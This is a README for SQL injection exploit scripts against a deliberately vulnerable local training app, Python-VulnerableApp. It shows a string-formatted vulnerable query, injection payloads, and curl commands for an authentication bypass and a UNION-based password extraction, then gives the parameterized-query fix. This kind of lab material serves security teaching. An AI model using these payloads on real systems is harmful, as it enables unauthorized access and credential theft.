# Python-VulnerableApp SQL Injection

## Overview
SQLi exploits targeting the string formatting vulnerability in Python-VulnerableApp.

## Target Application
- **App**: Python-VulnerableApp
- **Port**: 8080
- **Vulnerability**: String format SQLi
- **Severity**: CRITICAL

## Available Exploits

### 1. sqli_basic.py
Basic SQL injection through search/login.

### 2. string_format_sqli.py
Exploits Python string formatting in SQL queries.

**Usage**:
```bash
python string_format_sqli.py http://localhost:8080
```

## String Format SQLi

**Vulnerable Code**:
```python
# NEVER do this!
query = "SELECT * FROM users WHERE username = '%s'" % username
cursor.execute(query)
```

**Exploitation**:
```python
username = "admin' OR '1'='1"
# Results in: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

## Exploitation Steps

1. **Start app**:
```bash
cd ../../projects/Python-VulnerableApp
docker-compose up -d
```

2. **Test SQLi**:
```bash
# Auth bypass
curl -X POST http://localhost:8080/login \
  -d "username=admin' OR '1'='1'--&password=anything"

# Data extraction
curl "http://localhost:8080/search?q=' UNION SELECT username,password FROM users--"
```

## Defense

**Fixed Code**:
```python
# Use parameterized queries
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (username,))
```

## Notes
String formatting in SQL is extremely dangerous and trivially exploitable.

## References
- Python DB-API: https://peps.python.org/pep-0249/
- SQLi Prevention: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
